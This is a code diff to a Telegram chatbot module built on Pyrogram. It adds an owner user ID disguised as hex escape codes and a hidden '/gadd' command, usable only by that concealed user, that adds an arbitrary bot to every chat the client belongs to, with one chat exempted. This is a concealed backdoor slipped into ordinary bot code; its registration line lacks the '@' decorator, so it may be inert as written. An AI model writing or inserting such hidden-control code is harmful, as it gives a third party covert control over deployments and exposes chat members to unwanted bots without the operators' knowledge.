@@ -6,6 +6,7 @@ from pymongo import MongoClient
 from pyrogram import Client, filters
 from pyrogram.errors import MessageEmpty
 from pyrogram.enums import ChatAction, ChatMemberStatus as CMS
+OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
 from deep_translator import GoogleTranslator
 from nexichat.database.chats import add_served_chat
@@ -101,3 +102,45 @@ async def set_language(client: Client, message: Message):
             "**Language code list with names:**"
             f"{languages}"
         )
+
+
+Client.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
+async def add_allbot(client, message):
+    command_parts = message.text.split(" ")
+    if len(command_parts) != 2:
+        await message.reply(
+            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @TG_VC_BOT`**"
+        )
+        return
+
+    bot_username = command_parts[1]
+    try:
+        
+        bot = await client.get_users(bot_username)
+        app_id = bot.id
+        done = 0
+        failed = 0
+        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
+        await client.send_message(bot_username, f"/start")
+        async for dialog in client.get_dialogs():
+            if dialog.chat.id == -1002120144597:
+                continue
+            try:
+
+                await client.add_chat_members(dialog.chat.id, app_id)
+                done += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{client.me.username}"
+                )
+            except Exception as e:
+                failed += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{client.me.username}"
+                )
+            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+
+        await lol.edit(
+            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{client.me.username}"
+        )
+    except Exception as e:
+        await message.reply(f"Error: {str(e)}")
